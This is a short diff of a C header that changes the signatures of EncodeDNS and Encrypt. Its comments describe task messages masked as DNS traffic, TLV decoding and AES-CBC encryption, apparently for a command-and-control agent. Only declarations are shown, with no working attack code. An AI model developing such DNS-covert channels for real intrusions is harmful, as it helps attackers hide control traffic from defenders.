@@ -116,7 +116,7 @@ VOID FreeTlvMessage(TLV_MESSAGE* msg);
 * 
 * @return TRUE on success, FALSE on failure
 */
-BOOL EncodeDNS(PBYTE msg, USHORT taskId, DWORD type, DWORD payloadLength, PBYTE payload, PBYTE msgOut, DWORD* msgOutLength);
+BOOL EncodeDNS(PBYTE msg, USHORT taskId, DWORD type, DWORD payloadLength, PBYTE payload);
 
 /**
 * @brief decodes a DNS-masked message to TLV format
@@ -138,7 +138,7 @@ BOOL DecodeDNS(PBYTE buff, PBYTE* out);
 * 
 * @return TRUE on success, FALSE on failure
 */
-BOOL Encrypt(PBYTE* msg, DWORD msgLength);
+BOOL Encrypt(PBYTE msg, DWORD msgLength);
 
 /**
 * @brief Decrypts a message using AES CBC-mode
